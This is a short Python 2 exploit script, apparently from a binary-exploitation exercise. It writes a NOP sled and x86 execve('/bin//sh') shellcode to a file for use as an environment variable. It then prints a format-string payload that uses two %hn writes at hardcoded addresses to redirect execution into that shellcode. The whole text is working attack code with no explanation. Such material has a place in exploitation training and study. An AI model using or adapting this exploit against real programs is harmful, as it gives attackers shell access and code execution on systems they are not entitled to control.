import struct
shell = '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80'

nop = '\x90' * 0x200
open("env_shell", "w+").write(nop + shell)

# env_nop == 0xffffdda5

fmt1 = "%{:d}x%10$hn".format(0xdda5 - 8)
fmt2 = "%{:d}x%11$hn".format(0xffff - 0xdda5)

to1 = struct.pack("<I", 0x80497e0)
to2 = struct.pack("<I", 0x80497e2)

print to1 + to2 + fmt1 + fmt2
